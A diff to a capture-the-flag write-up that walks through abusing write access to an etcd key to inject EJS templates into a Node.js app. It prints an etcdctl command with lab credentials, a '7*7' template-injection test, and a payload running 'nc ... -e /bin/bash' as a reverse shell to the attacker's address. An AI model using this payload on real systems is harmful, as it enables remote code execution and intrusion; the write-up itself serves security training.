@@ -104,8 +104,11 @@ From the content of the `/nodejs/index` key we observe and find out that it is t
 Testing our theory.
 Since we have write access to `/nodejs/index` key we will write our own content to verify if we can obtain code exeuction. Payload: `Bingo: <%= 7*7 %>`
 ```
-
+ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/nodejs/index" "Bingo: <%= 7*7 %>" 
+OK
 ```
+And after reloading the web app on port `1337` this is what we get:
+![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/ssti_1337_poc.png)
 
 After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target.
 `<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`
